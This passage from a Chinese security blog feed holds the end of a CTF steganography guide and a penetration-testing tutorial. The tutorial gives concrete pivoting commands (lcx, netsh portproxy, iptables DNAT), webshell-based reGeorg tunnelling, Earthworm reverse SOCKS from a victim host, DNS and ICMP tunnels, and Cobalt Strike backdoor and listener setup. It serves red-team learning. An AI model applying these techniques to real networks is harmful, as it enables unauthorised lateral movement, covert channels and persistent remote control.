title="B.MSU Stego隐写"></a>B.MSU Stego隐写</h5><p>MSU StegoVideo 数据隐写</p><p>这个隐写也是考了知识面吧，题目较少</p><p><strong>解法：</strong></p><p>选中”Extract file from video”:</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/17/IN3oXFRn2YbCqLg.png" alt="image-20200617160830674"></p><p>选择带有隐藏信息的文件和一个空白的用于保存提取出来的信息的 .txt 文件：</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/17/cHfvkLS24CjPXr1.png" alt="image-20200617162437195"></p><p>输入密码：(这个密码是在生成的时候设置的，考题可能会在其他地方会有提示)</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/17/kOxgqWjHCso7r14.png" alt="image-20200617162556361"></p><p>正在进行信息提取操作：</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/17/vaMYhK3obJs62CU.png" alt="image-20200617162609599"></p><p>操作完成后，就会得到隐藏的信息。</p><p>隐藏的步骤可以自己去尝试</p><h5 id="C-TCStego隐写"><a href="#C-TCStego隐写" class="headerlink" title="C.TCStego隐写"></a>C.TCStego隐写</h5><p>和MSU Stego一样，主要是考了知识面</p><h3 id="电子文档隐写"><a href="#电子文档隐写" class="headerlink" title="电子文档隐写"></a>电子文档隐写</h3><p>电子文档，它主要包括电子文书、电子信件、电子报表、电子图纸、纸质文本文档的电子版本等等，是人们电脑办公中必不可少的文件。</p><h4 id="一、word隐写"><a href="#一、word隐写" class="headerlink" title="一、word隐写"></a>一、word隐写</h4><p>微软的Word一直是文字处理软件中的佼佼者。微软的Word、Excel、PowerPoint提供了许多在文档中隐藏数据的方法，包括批注、个人信息、水印、不可见内容、隐藏文字和定制的XML数据。最简单，也是最奇妙的，也就是这里将提到的隐藏文本功能。</p><h5 id="利用隐藏文本功能进行隐写"><a href="#利用隐藏文本功能进行隐写" class="headerlink" title="利用隐藏文本功能进行隐写"></a>利用隐藏文本功能进行隐写</h5><p><strong>实验：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 在实验机中找到隐写术目录，打开电子文档隐写，打开flag.doc</span><br><span class="line">- 在菜单栏中选择，并单击File（文件）-&gt;Tool（工具）-&gt;Option（选项） </span><br><span class="line">- 找到 隐藏文字 功能，选择这个功能，点击保存</span><br><span class="line">- 最终flag&#123;doc_stego_is_ez&#125;</span><br></pre></td></tr></table></figure><p><strong>首先打开，flag.doc</strong><br>打开flag.doc，能看到的文字内容只有<code>Flag in here。</code>,我们就可以猜测，flag是被隐藏起来了</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/14/JLdmzNC1kVhTW97.png" alt="image-20200614105634162"></p><p><strong>开启隐藏文字显示功能，查看flag是否被隐写</strong><br>在文件栏中，找到选项，打开显示，隐藏文字选项</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/14/YFlaW2tqB4vpiMK.png" alt="image-20200614105617350"></p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/14/wgpCzhIvT48irD2.png" alt="image-20200614105314028"></p><p><strong>思考</strong></p><ol><li>尝试将文本中的 Flag in here。 也隐藏掉。</li><li>尝试使用word自带的文档检查器检查是否又文字隐藏</li></ol><h5 id="word文档的xml转换"><a href="#word文档的xml转换" class="headerlink" title="word文档的xml转换"></a>word文档的xml转换</h5><p>我们可以将word文档转换成xml格式，当然反过来我们也可以将xml转换成word文档，这导致了我们如果重新打包为word文档的过程中，有可能被隐藏进其他数据。</p><p><strong>实验：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 在实验机中找到隐写术目录，打开电子文档隐写，打开file.docx</span><br><span class="line">- 看到的内容是 This is not the flag you&#39;re looking for.</span><br><span class="line">- 我们可以尝试分离word文档</span><br><span class="line">- 发现，其中包含了一个flag.txt的文件，我们可以直接用7Z，使用zip的方法重新打开file.doc</span><br><span class="line">- 打开flag.txt，最终flag&#123;this_would_be_the_flag_you_are_looking_for&#125;</span><br></pre></td></tr></table></figure><p><strong>首先，找到文件并打开文件查看</strong></p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/14/S8rMghJPwGN5LQX.png" alt="image-20200614105905294"></p><p><strong>尝试分离文件内容</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+bash-4.3$ file file.docx </span><br><span class="line">file.docx: Zip archive data, at least v2.0 to extract</span><br><span class="line">+bash-4.3$ 7z x file.docx -oout</span><br><span class="line"></span><br><span class="line">7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18</span><br><span class="line">p7zip Version 9.20 (locale&#x3D;utf8,Utf16&#x3D;on,HugeFiles&#x3D;on,8 CPUs)</span><br><span class="line"></span><br><span class="line">Processing archive: file.docx</span><br><span class="line"></span><br><span class="line">Extracting  word&#x2F;numbering.xml</span><br><span class="line">Extracting  word&#x2F;settings.xml</span><br><span class="line">Extracting  word&#x2F;fontTable.xml</span><br><span class="line">Extracting  word&#x2F;styles.xml</span><br><span class="line">Extracting  word&#x2F;document.xml</span><br><span class="line">Extracting  word&#x2F;_rels&#x2F;document.xml.rels</span><br><span class="line">Extracting  _rels&#x2F;.rels</span><br><span class="line">Extracting  [Content_Types].xml</span><br><span class="line">Extracting  flag.txt</span><br><span class="line"></span><br><span class="line">Everything is Ok</span><br></pre></td></tr></table></figure><p>我们会发现又flag.txt的文件被打包在file.docx中，<br><strong>直接用7z等压缩包工具打开file.docx</strong></p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/14/Pabuoxc9ENVqSsR.png" alt="image-20200614110300105"></p><p><strong>思考</strong></p><ol><li>思考，如何制作这种隐写呢？</li><li>试试能否用binwalk 或者strings等工具查看隐写痕迹。</li></ol><h4 id="二、PDF文件中的信息隐藏"><a href="#二、PDF文件中的信息隐藏" class="headerlink" title="二、PDF文件中的信息隐藏"></a>二、PDF文件中的信息隐藏</h4><p>PDF隐写中，我们最常用，也是最熟知的工具就是wbStego4open,这是可以把文件隐藏到BMP，TXT,HTM和PDF文件中的工具，当然，这里我们只用他来最为以PDF为载体进行隐写的工具。</p><h5 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h5><ul><li>wbStego4open</li></ul><p><strong>实验：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 在实验机中找到隐写术目录，打开电子文档隐写，找到  stego.pdf文档</span><br><span class="line">- 在工具目录中找到 wbStego4open，使用工具载入文档，</span><br><span class="line">- 根据提示，一步一步完成隐藏信息的提取</span><br><span class="line">- 最终flag&#123;CTF_is_funny&#125;</span><br></pre></td></tr></table></figure><p><strong>首先找到目标文件</strong><br>在实验机中找到隐写术目录，打开电子文档隐写，找到 stego.pdf文档</p><p><strong>其次，找到工具wbStego4open</strong><br>在工具目录中找到 wbStego4open，使用工具载入文档，<br>Step 1 是文件介绍<br>Step 2 中，我们选择Decode，<br>Step 3 我们选择目标文件<br>Step 4 输入加密密码，如果是空密码，直接跳过<br>Step 5 为保存文件为 flag.txt</p><p>这道题没了大伙自己网上去找</p><p><strong>最后打开保存后的文件，flag.txt</strong><br>最后打开保存后的文件，flag.txt，就能得到flag了。</p><p><strong>思考</strong></p><ol><li>查阅其他资料，是否还要其他的PDF隐写方式，其原理又是什么？</li></ol><hr><h3 id="其他隐写"><a href="#其他隐写" class="headerlink" title="其他隐写"></a>其他隐写</h3><h4 id="一、数据包隐写术"><a href="#一、数据包隐写术" class="headerlink" title="一、数据包隐写术"></a>一、数据包隐写术</h4><p>数据包隐写术，就是将所要传达的信息和文件，以流量包的形式下发给参赛选手，参赛选手要从流量包中自行提取出所需要的文件或者相关内容进行解题。比较常用的工具是wireshark。关于此类部分的详细介绍，大家可以访问这个网址：<a href="https://ctf-wiki.github.io/ctf-wiki/misc/traffic/data/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/misc/traffic/data/</a></p><h5 id="常用工具：-5"><a href="#常用工具：-5" class="headerlink" title="常用工具："></a>常用工具：</h5><ul><li>wireshark</li></ul><p>数据包隐写术目前两种考察行为：</p><p>①、flag或者关键信息直接隐藏在流量包中</p><p>②、flag相关文件隐藏在流量包中，需要分离文件</p><h4 id="二、细微的颜色差别"><a href="#二、细微的颜色差别" class="headerlink" title="二、细微的颜色差别"></a>二、细微的颜色差别</h4><p>就是看细心程度</p><p>藏在第一列的第四只皮卡丘的酒窝里</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/14/8nVd4DWyoTqmj5b.png" alt="image-20200614112236379"></p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/14/BLQ7jJZIa2kSOCs.png" alt="image-20200614112349386"></p><p>其他的题型随时补充</p><hr><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>一般的MISC题目都不是简简单单的一个隐写就能解决的，正常都包含了密码，编码，隐写甚至更多的计算机网络知识。</p><hr><p>本文大部分源于<a href="https://link.zhihu.com/?target=https%3A//xz.aliyun.com/">先知社区</a>中M1n3所作<a href="https://xz.aliyun.com/t/1833" target="_blank" rel="noopener">Misc 总结 —-隐写术之图片隐写</a>一文，对其进行了相应的补充并增加了自己的思考以作为自己的学习笔记，如有侵删。</p>]]></content:encoded>
      
      <comments>http://yoursite.com/undefined/Misc%E9%9A%90%E5%86%99%E6%9C%AF%E6%80%BB%E7%BB%93/#disqus_thread</comments>
    </item>
    
    <item>
      <title>内网渗透工具</title>
      <link>http://yoursite.com/undefined/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</link>
      <guid>http://yoursite.com/undefined/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</guid>
      <pubDate>Thu, 04 Jun 2020 13:56:06 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;内网渗透&quot;&gt;&lt;a href=&quot;#内网渗透&quot; class=&quot;headerlink&quot; title=&quot;内网渗透&quot;&gt;&lt;/a&gt;内网渗透&lt;/h1&gt;&lt;h2 id=&quot;TCP内网穿透&quot;&gt;&lt;a href=&quot;#TCP内网穿透&quot; class=&quot;headerlin
        
      
      </description>
      
      
      <content:encoded><![CDATA[<p>[TOC]</p><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="TCP内网穿透"><a href="#TCP内网穿透" class="headerlink" title="TCP内网穿透"></a>TCP内网穿透</h2><h3 id="常见内网穿透手段与工具介绍与使用"><a href="#常见内网穿透手段与工具介绍与使用" class="headerlink" title="常见内网穿透手段与工具介绍与使用"></a>常见内网穿透手段与工具介绍与使用</h3><p><strong>使用场景：</strong></p><p>攻击者从外网打开了入口，想入侵更多的内网机器</p><h4 id="常见工具"><a href="#常见工具" class="headerlink" title="常见工具"></a>常见工具</h4><p>lcx.exe   netsh   portmap   iptables</p><h5 id="LCX端口转发使用："><a href="#LCX端口转发使用：" class="headerlink" title="LCX端口转发使用："></a>LCX端口转发使用：</h5><p>lcx有两大功能：</p><ul><li>端口转发（listen和slave成对使用）</li><li>端口映射（tran）</li></ul><p><strong>端口转发：</strong></p><p>Lcx -Listen &lt;监听slave请求的端口(对应slave的第二个参数)&gt; &lt;等待连接的端口&gt;</p><p>Lcx -slave &lt;你的ip&gt; &lt;监听端口(对应listen的第一个参数)&gt; &lt;目标ip&gt; &lt;目标端口&gt;</p><p><strong>使用示例：</strong></p><p>使用环境：本机外网IP，它机内网IP</p><p>本机上运行：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lcx -listen 34 3434</span><br></pre></td></tr></table></figure><p>这句话的意思就是监听本机的34端口然后将数据转发到3434端口</p><p>它机上运行：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lcx -slave 10.128.2.171 34 192.168.56.134 21</span><br></pre></td></tr></table></figure><p>假设本机IP为10.128.2.171 被控机为192.168.56.134</p><p>这句话的意思是内网被控机将21端口转发到本机IP—10.128.2.171的34端口上</p><p>然后本机就能通过连接本地的3434端口进行监听控制</p><h5 id="LCX端口映射使用："><a href="#LCX端口映射使用：" class="headerlink" title="LCX端口映射使用："></a>LCX端口映射使用：</h5><p>lcx有两大功能：</p><ul><li>端口转发（listen和slave成对使用）</li><li>端口映射（tran）</li></ul><p>Lcx -tran &lt;等待连接的端口&gt; &lt;目标ip&gt; &lt;目标端口&gt;</p><p>这句话的意思是将本机的等待映射的端口映射到目标ip 的目标端口</p><h5 id="Windows自带的转发工具netsh："><a href="#Windows自带的转发工具netsh：" class="headerlink" title="Windows自带的转发工具netsh："></a>Windows自带的转发工具netsh：</h5><p>配置方法<br>假定需要通过192.168.1.8的14941端口连接192.168.1.118的1494端口，则需要在192.168.1.8主机的命令行输入如下语句</p><p><strong>开启IPv6支持</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netsh interface ipv6 install</span><br></pre></td></tr></table></figure><p><strong>如果操作系统开启了主机防火墙，需要放行TCP 14941的入站连接，下面是配置端口转发的两条语句，区别不大，一条指定IP，一条默认本机IP</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenaddress&#x3D;192.168.1.8 listenport&#x3D;14941 connectaddress&#x3D;192.168.1.118 connectport&#x3D;1494</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport&#x3D;14941 connectaddress &#x3D;192.168.1.118 connectport&#x3D;1494</span><br></pre></td></tr></table></figure><p><strong>取消上面配置的端口转发，可以用如下语句：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy delete v4tov4 listenaddress 192.168.1.8 listenport &#x3D;33891</span><br></pre></td></tr></table></figure><p><strong>如果想查看已经配置了哪些端口转发，可以用如下语句：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy show v4tov4</span><br></pre></td></tr></table></figure><h5 id="LINUX自带的转发工具iptables："><a href="#LINUX自带的转发工具iptables：" class="headerlink" title="LINUX自带的转发工具iptables："></a>LINUX自带的转发工具iptables：</h5><p><strong>首先开启内核转发：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo 1&gt;&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward          &#x2F;&#x2F;当主机发现不是自己的流量就会进行转发</span><br><span class="line">sysctl -p                                     &#x2F;&#x2F;立即生效</span><br></pre></td></tr></table></figure><p><strong>配置iptables进行端口转发</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp -m tcp --dport21521 -j DNET --to-destination 192.168.0.211:1521</span><br><span class="line">&#x2F;&#x2F;把目的端口为21521的端口的流量转发到192.168.0.211主机的1521端口，DNAT表示目的地址转换</span><br><span class="line">iptables -t nat -A POSTROUTING -s 192.168.0.0&#x2F;16 -d 192.168.0.211 -p tcp -m tcp --dport 1521 -j SNAT --to-source 192.168.0.132</span><br><span class="line">&#x2F;&#x2F;指定192.168.0.0&#x2F;16 ip段的请求进行来源地址转换</span><br></pre></td></tr></table></figure><h3 id="内网代理工具"><a href="#内网代理工具" class="headerlink" title="内网代理工具"></a>内网代理工具</h3><h4 id="regeorg内网代理工具"><a href="#regeorg内网代理工具" class="headerlink" title="regeorg内网代理工具"></a>regeorg内网代理工具</h4><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606132624260.png" alt="image-20200606132624260"></p><p>reGeorgSocksProxy.py是运行在本机上的，渗透一个网站之后，上传对应格式的tunnel文件到服务器</p><h5 id="step1："><a href="#step1：" class="headerlink" title="step1："></a>step1：</h5><p>首先通过webshell等方式上传对应的可使用的代理脚本</p><h5 id="step2："><a href="#step2：" class="headerlink" title="step2："></a>step2：</h5><p>然后攻击者在本地执行python脚本，利用网络上的脚本建立socks5代理隧道</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -u http:&#x2F;&#x2F;10.128.2.171&#x2F;tunnel.nosocket.php</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606135145093.png" alt="image-20200606135145093"></p><p>此时用软件连接到socks5代理127.0.0.1:8888就处于该服务器的内网环境了</p><h4 id="配合使用的软件："><a href="#配合使用的软件：" class="headerlink" title="配合使用的软件："></a>配合使用的软件：</h4><p><strong>MAC下：</strong><br>proxychains（Proxifier/直接用burpsuite或浏览器连接到socks5代理<br><strong>Windows下：</strong><br>Proxifier.exe/直接用burpsuite或浏览器连接到socks5代理<br><strong>Linux下：</strong><br>proxychains</p><p><strong>proxychains配置</strong></p><p>首先修改配置文件</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606135511794.png" alt="image-20200606135511794"></p><p>在MAC或者linux_上，修改配置文件后，就可以直接在想执行的命令前加上proxychians命令，这样会自动让后面的命令通过代理执行</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606135625508.png" alt="image-20200606135625508"></p><h3 id="集代理和端口转发功能于一身的Earthworm（多平台）"><a href="#集代理和端口转发功能于一身的Earthworm（多平台）" class="headerlink" title="集代理和端口转发功能于一身的Earthworm（多平台）"></a>集代理和端口转发功能于一身的Earthworm（多平台）</h3><h4 id="直接当做socks5代理使用"><a href="#直接当做socks5代理使用" class="headerlink" title="直接当做socks5代理使用"></a>直接当做socks5代理使用</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ew_win32.exe -s ssocksd -h</span><br><span class="line">&#x2F;&#x2F;列出参数</span><br></pre></td></tr></table></figure><p>使用命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ew_win32.exe -s ssocksd -l 8082</span><br><span class="line">&#x2F;&#x2F;监听8082端口</span><br></pre></td></tr></table></figure><h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><p>rssocks和rcsocks则是成对使用的选项，可以直接搭建lcx那样的端口转发隧道，只不过转发的端口直接就是earthworm提供的socks5代理</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606140307805.png" alt="image-20200606140307805"></p><p>内网victim主机执行的是将建立在本地的socks5代理转发到公网某端口<br>公网attacker的主机执行的是监听两个端口，一个用来接收attacker的链接，一个用来转发内网的代理</p><h5 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h5><p>首先在公网主机上监听好两个端口，等待内网主机链接</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606140721591.png" alt="image-20200606140721591"></p><h5 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h5><p>然后在victim的电脑上执行earthworm以开启socks5代理，并执行转发</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606140744284.png" alt="image-20200606140744284"></p><h5 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h5><p>浏览器设置好代理后就相当于已经处于该内网直接可以访问内网的资源</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606140856159.png" alt="image-20200606140856159"></p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606140910046.png" alt="image-20200606140910046"></p><p>或者也可以通过<br>proxychains/proxifier把代理用在其<br>他的一些工具上<br>nmap/sqlmap/rdesktop</p><h3 id="多级级联"><a href="#多级级联" class="headerlink" title="多级级联"></a>多级级联</h3><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606141238357.png" alt="image-20200606141238357"></p><p>数据流向：SOCKS v5-&gt; 1080-&gt; 8888-&gt; 9999-&gt; 7777-&gt; rssocks</p><h3 id="ICMP-UDP内网穿透"><a href="#ICMP-UDP内网穿透" class="headerlink" title="ICMP/UDP内网穿透"></a>ICMP/UDP内网穿透</h3><h4 id="icmptunnel内网穿透"><a href="#icmptunnel内网穿透" class="headerlink" title="icmptunnel内网穿透"></a>icmptunnel内网穿透</h4><p>icmptunnel借助icmp协议进行通信</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606141542429.png" alt="image-20200606141542429"></p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606141552013.png" alt="image-20200606141552013"></p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606141640116.png" alt="image-20200606141640116"></p><h4 id="服务端执行的脚本和启动命令"><a href="#服务端执行的脚本和启动命令" class="headerlink" title="服务端执行的脚本和启动命令"></a>服务端执行的脚本和启动命令</h4><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606141716894.png" alt="image-20200606141716894"></p><h4 id="客户端执行的脚本和启动的命令"><a href="#客户端执行的脚本和启动的命令" class="headerlink" title="客户端执行的脚本和启动的命令"></a>客户端执行的脚本和启动的命令</h4><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606141809132.png" alt="image-20200606141809132"></p><h3 id="DNS协议穿透内网"><a href="#DNS协议穿透内网" class="headerlink" title="DNS协议穿透内网"></a>DNS协议穿透内网</h3><h4 id="dns2tcp工具安装"><a href="#dns2tcp工具安装" class="headerlink" title="dns2tcp工具安装"></a>dns2tcp工具安装</h4><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606142043435.png" alt="image-20200606142043435"></p><h4 id="解析域名"><a href="#解析域名" class="headerlink" title="解析域名"></a>解析域名</h4><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606142111545.png" alt="image-20200606142111545"></p><p>一条A记录和一条Ns记录当查询到ssrf这个子域名的时候(xxxx.ssrf.nuptzj.cn)会去ns记录指向的blog子域名查询</p><h4 id="配置服务端"><a href="#配置服务端" class="headerlink" title="配置服务端"></a>配置服务端</h4><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606142433789.png" alt="image-20200606142433789"></p><p>启动服务器端</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dns2tcpd -f &#x2F;etc&#x2F;dns2tcpd.conf -d 1</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606142523168.png" alt="image-20200606142523168"></p><p>启动客户端 </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dns2tcpc -r ssh -I 7777 -z ssrf.nuptzj.cn blog.nuptzj.cn</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606143114174.png" alt="image-20200606143114174"></p><p>连接到ssh服务</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606143205496.png" alt="image-20200606143205496"></p><h3 id="端口复用技术"><a href="#端口复用技术" class="headerlink" title="端口复用技术"></a>端口复用技术</h3><p>参考链接 <a href="https://xz.aliyun.com/t/1661" target="_blank" rel="noopener">https://xz.aliyun.com/t/1661</a></p><h2 id="常见工具介绍与使用"><a href="#常见工具介绍与使用" class="headerlink" title="常见工具介绍与使用"></a>常见工具介绍与使用</h2><h3 id="Cobaltstrike使用介绍"><a href="#Cobaltstrike使用介绍" class="headerlink" title="Cobaltstrike使用介绍"></a>Cobaltstrike使用介绍</h3><h4 id="Cobaltstrike搭建与应用"><a href="#Cobaltstrike搭建与应用" class="headerlink" title="Cobaltstrike搭建与应用"></a>Cobaltstrike搭建与应用</h4><p>启动Cobaltstrike Team Server</p><p>配置完java环境以后直接运行teamserver文件就可以开启<br>./teamserver[服务器的IP] [你的连接密码]</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606144233886.png" alt="image-20200606144233886"></p><p>Cobalt Strike Client<br>运行cobaltstrike客户端文件连接到该服务器</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606144742574.png" alt="image-20200606144742574"></p><p>在面板中填入配置信息就可以点击connect连接到C&amp;C服务器，Cobaltstrike是一个适合团队协作的平台，可以多人连接到服务器，一起对客户机进行渗透操作，共享shell</p><h4 id="Listener设置"><a href="#Listener设置" class="headerlink" title="Listener设置"></a>Listener设置</h4><p>首次使用需要先设置一个默认的listener，就是指的程序默认监听回连靶机的方式（就是渗透的靶机回连的端口是vps的8088端口，然后客户端这边监听vps的8088）</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606144855822.png" alt="image-20200606144855822"></p><p>监听有很多种方式，dns，ttp，https选择https或者dns协议会让通信更加隐秘，不那么容易被侦测到流量<img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606145236715.png" alt="image-20200606145236715"></p><h4 id="Attacks模块"><a href="#Attacks模块" class="headerlink" title="Attacks模块"></a>Attacks模块</h4><p>设置完监听我们就可以来看看有哪些方式能用来攻击</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606145433934.png" alt="image-20200606145433934"></p><p>Cs提供的直接生成恶意文件的方式</p><p>Cs提供的包括站点克隆（钓鱼），添加文件到网页 链接利用WEB方式传输payload，应用识别等辅助攻击功能</p><h4 id="生成可执行文件后门"><a href="#生成可执行文件后门" class="headerlink" title="生成可执行文件后门"></a>生成可执行文件后门</h4><p>使用Attacks-&gt;Packages–&gt;Windows executable生成一个恶意文件</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606145830581.png" alt="image-20200606145830581"></p><p>listener表示当对方运行了这个.exe文件后，对方已怎样的方式回连到主控端</p><h4 id="执行效果"><a href="#执行效果" class="headerlink" title="执行效果"></a>执行效果</h4><p>通过各种手段让靶机执行以后，可以看到客户端上线啦~<br>CS的载荷不是时刻保持socket通信的，而是有–定的心跳时间，默认是每一分钟会向C&amp;C服务器拉取一-下最新的指令并执行，所以我们下达指令后，靶机会周期性的来获取命令然后执行并返回结果（可以通过Beacon中的sleep命令调整时间）</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606150051268.png" alt="image-20200606150051268"></p><h4 id="如何进入Beacon控制台"><a href="#如何进入Beacon控制台" class="headerlink" title="如何进入Beacon控制台"></a>如何进入Beacon控制台</h4><p>对着目标右键选择interact可以进入这个目标的控制台界面</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606150458393.png" alt="image-20200606150458393"></p><h3 id="Metasploit使用介绍"><a href="#Metasploit使用介绍" class="headerlink" title="Metasploit使用介绍"></a>Metasploit使用介绍</h3><h3 id="Empire使用介绍"><a href="#Empire使用介绍" class="headerlink" title="Empire使用介绍"></a>Empire使用介绍</h3><h4 id="Empire工具安装向导"><a href="#Empire工具安装向导" class="headerlink" title="Empire工具安装向导"></a>Empire工具安装向导</h4><p>项目地址：<br><a href="https://github.com/EmpireProject/Empire" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire</a><br>安装方法：<br>使用ubuntu或者debian<br>git clone <a href="https://github.com/EmpireProject/Empire" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire</a><br>cd setup&amp;&amp;sudo./install.sh<br>这个工具安装前要先配置好python和pip</p><h4 id="设置Listener"><a href="#设置Listener" class="headerlink" title="设置Listener"></a>设置Listener</h4><p>empire的监听方式</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606152723567.png" alt="image-20200606152723567"></p><p>包含的类型比较多：<br>●可以委派给其他监听器的比如msf的meterpreter<br>●基于利用微软onedrive作为c&amp;c服务器 的监听器onedrive直接是在本机监听http及 多种http相关协议的多个监听器</p><p>执行uselistener 